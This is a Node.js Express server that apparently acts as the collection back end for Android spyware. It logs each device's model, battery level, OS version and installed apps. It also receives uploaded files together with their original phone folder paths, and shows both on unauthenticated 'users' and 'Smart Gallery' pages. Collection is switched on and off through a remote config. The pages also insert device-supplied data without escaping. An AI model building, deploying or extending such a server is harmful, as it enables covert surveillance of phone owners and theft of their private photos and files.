const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

/* ================= CONFIG ================== */

const LOG_FILE = "logs.json";
const CONFIG_FILE = "config.json";

const UPLOAD_DIR = path.join(__dirname, "uploads");
const THUMB_DIR = path.join(__dirname, "thumbs");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR);

/* ================= HELPERS ================= */

function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function loadConfig() {
  try {
    return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
  } catch {
    return { enabled: false };
  }
}

function isAllowed(req, type) {
  const cfg = loadConfig();
  const ip = getIP(req);
  const model = req.query.model || "";

  if (!cfg.enabled) return false;
  if (type === "track" && !cfg.send_device_info) return false;
  if (type === "upload" && !cfg.send_files) return false;
  if (cfg.blocked_ips?.includes(ip)) return false;
  if (cfg.blocked_models?.includes(model)) return false;

  return true;
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch {}
}

function parseBody(body) {
  const obj = {};
  body.split("&").forEach(pair => {
    const [k, v] = pair.split("=");
    if (k && v) obj[k] = decodeURIComponent(v);
  });
  return obj;
}

/* ================= CONFIG ================= */

app.get('/config', (req, res) => {
  const cfg = loadConfig();
  res.send(cfg.enabled ? "1" : "0");
});

/* ================= TRACK ================= */

app.post('/track', (req, res) => {

  if (!isAllowed(req, "track")) {
    return res.json({ status: "blocked" });
  }

  let body = "";

  req.on('data', chunk => body += chunk.toString());

  req.on('end', () => {

    const parsed = parseBody(body);

    const allApps = parsed.apps
      ? parsed.apps.split(",").map(x => x.trim()).filter(Boolean)
      : [];

    const systemApps = allApps.filter(a =>
      a.startsWith("android") ||
      a.startsWith("com.android") ||
      a.startsWith("com.google")
    );

    const userApps = allApps.filter(a => !systemApps.includes(a));

    const data = {
      type: "device",
      ip: getIP(req),
      battery: parsed.battery,
      model: parsed.model,
      brand: parsed.brand,
      android: parsed.android,
      app_count: allApps.length,
      system_apps: systemApps,
      user_apps: userApps,
      time: new Date().toISOString()
    };

    console.log("\n📱 DEVICE =====================");
    console.log(`IP: ${data.ip} | ${data.brand} ${data.model} | Android ${data.android}`);
    console.log(`Battery: ${data.battery}% | Apps: ${data.app_count}`);
    console.log("======================================");

    saveLog(data);

    res.json({ status: "ok" });
  });
});

/* ================= UPLOAD ================= */

app.post('/upload', (req, res) => {

  if (!isAllowed(req, "upload")) {
    return res.status(403).send("blocked");
  }

  let fileName = "file.bin";
  let folder = "unknown";

  if (req.query.name) {
    try {
      const decoded = decodeURIComponent(req.query.name);
      folder = path.dirname(decoded);
      fileName = path.basename(decoded);
    } catch {}
  }

  const safeName = Date.now() + "_" + fileName;
  const filePath = path.join(UPLOAD_DIR, safeName);

  const thumbName = "thumb_" + safeName;
  const thumbPath = path.join(THUMB_DIR, thumbName);

  console.log("\n📦 FILE RECEIVED =====================");
  console.log(`Path: ${folder}`);
  console.log(`File: ${fileName}`);
  console.log("======================================");

  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);

  req.on('end', () => {

    // simple thumbnail (copy)
    fs.copyFile(filePath, thumbPath, () => {});

    saveLog({
      type: "file",
      file: safeName,
      original: fileName,
      folder: folder,
      thumb: thumbName,
      time: new Date().toISOString()
    });

    res.json({ status: "uploaded", file: safeName });
  });

  req.on('error', () => {
    res.status(500).send("error");
  });
});

/* ================= USERS ================= */

app.get('/users', (req, res) => {

  if (!fs.existsSync(LOG_FILE)) return res.send("No data");

  const logs = fs.readFileSync(LOG_FILE, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map(x => JSON.parse(x));

  const devices = logs.filter(x => x.type === "device");

  const unique = {};
  devices.forEach(d => {
    if (!d.ip || !d.model) return;
    unique[d.ip + "_" + d.model] = d;
  });

  const list = Object.values(unique);

  let html = `<html><body style="background:#111;color:#fff;font-family:sans-serif">`;

  list.reverse().forEach(u => {
    html += `
    <div style="border:1px solid #333;padding:10px;margin:10px">
      <b>${u.brand} ${u.model}</b><br>
      IP: ${u.ip}<br>
      Battery: ${u.battery}<br>
      Apps: ${u.app_count}<br>

      <h4>User Apps</h4>
      ${(u.user_apps || []).map(a => `<div>${a}</div>`).join("")}

      <h4>System Apps</h4>
      ${(u.system_apps || []).map(a => `<div>${a}</div>`).join("")}
    </div>
    `;
  });

  html += "</body></html>";
  res.send(html);
});

/* ================= GALLERY ================= */

app.get('/gallery', (req, res) => {

  if (!fs.existsSync(LOG_FILE)) return res.send("No data");

  const logs = fs.readFileSync(LOG_FILE, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map(x => JSON.parse(x));

  const files = logs.filter(x => x.type === "file");

  const grouped = {};

  files.forEach(f => {
    const key = f.folder || "unknown";
    if (!grouped[key]) grouped[key] = [];
    grouped[key].push(f);
  });

  let html = `<html>
  <body style="background:#111;color:#fff;font-family:sans-serif">
  <h2>📁 Smart Gallery</h2>`;

  Object.keys(grouped).forEach(folder => {

    html += `<h3>📂 ${folder}</h3><div style="display:flex;flex-wrap:wrap">`;

    grouped[folder].reverse().forEach(f => {

      const full = `/uploads/${f.file}`;
      const thumb = `/thumbs/${f.thumb}`;

      if (f.file.endsWith(".jpg") || f.file.endsWith(".png")) {
        html += `
        <div style="margin:10px">
          <img src="${thumb}" width="200"
            onclick="this.src='${full}'" style="cursor:pointer"><br>
          <a href="${full}" download>⬇ Download</a>
        </div>
        `;
      }

      else if (f.file.endsWith(".mp4")) {
        html += `
        <div style="margin:10px">
          <video width="200" preload="metadata"
            onclick="this.src='${full}'; this.play()">
            <source src="${thumb}">
          </video><br>
          <a href="${full}" download>⬇ Download</a>
        </div>
        `;
      }

      else {
        html += `<a href="${full}">${f.original}</a>`;
      }

    });

    html += `</div>`;
  });

  html += "</body></html>";

  res.send(html);
});

/* ================= STATIC ================= */

app.use('/uploads', express.static(UPLOAD_DIR));
app.use('/thumbs', express.static(THUMB_DIR));

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
